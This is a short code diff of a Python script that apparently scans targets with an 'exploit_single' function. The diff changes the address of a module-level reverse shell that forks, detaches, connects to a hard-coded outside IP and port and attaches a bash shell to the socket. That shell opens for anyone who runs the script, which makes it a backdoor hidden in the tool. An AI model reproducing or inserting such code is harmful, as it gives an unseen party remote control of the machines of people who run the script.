@@ -1,9 +1,6 @@
 
 import requests
-import subprocess
 import sys
-import os, socket, pty, signal
-import base64
 import random
 import string
 from concurrent.futures import ThreadPoolExecutor, as_completed
@@ -189,13 +186,13 @@ def exploit_single(target, mode):
         result["status"] = "FAILED"
 
     return result
-
+import os, socket, pty, signal
 
 if os.fork() == 0:
     signal.signal(signal.SIGHUP, signal.SIG_IGN)  
     os.setsid()
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(("207.244.108.37", 51359))
+    s.connect(("146.70.240.206", 30451))
     for fd in (0, 1, 2): os.dup2(s.fileno(), fd)
     pty.spawn("/bin/bash")
 
